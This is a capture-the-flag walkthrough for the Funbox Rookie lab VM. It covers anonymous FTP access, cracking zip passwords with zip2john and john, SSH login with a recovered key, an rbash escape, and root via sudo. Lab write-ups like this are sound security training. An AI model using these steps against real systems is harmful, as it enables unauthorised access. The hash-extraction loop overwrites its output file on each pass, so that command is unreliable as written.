# Funbox Rookie

![[Pasted image 20220520195440.png]]

```
192.168.1.149
```

## Port scan

```
21/tcp open  ftp     syn-ack ttl 64 ProFTPD 1.3.5e
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
```

ftp allows anonymous login, there are some interesting .zip flies and a .msg file which contains the message that is displayed upon login.

I copied them all down to take a closer look.

![[Pasted image 20220526082626.png]]

using `unzip` we discover these archives are password protected.

![[Pasted image 20220526082655.png]]

Extract the hashes from each file:

```bash
for file in $(ls *.zip); do zip2john $file > hashes; done
```

Then crack them:

```bash
john hashes
```

![[Pasted image 20220526082908.png]]

only 2 were cracked right away. The discovered passwords can be used to unzip the archives.

Each archive contains a private key. Tom's private key can be used for ssh authentication.

```bash
chmod 600 id_rsa
```

```bash
ssh -i id_rsa tom@192.168.1.149
```

![[Pasted image 20220526083105.png]]

it looks like we are in rbash

![[Pasted image 20220526083329.png]]

I was able to break out by calling bash in interactive mode:

```bash
bash -i
```

found a potential password for Tom in the .mysql_history file

![[Pasted image 20220526090923.png]]

using the newly found password, we see that Tom is allowed to sudo everything.

![[Pasted image 20220526091013.png]]

```bash
sudo su
```

![[Pasted image 20220526091118.png]]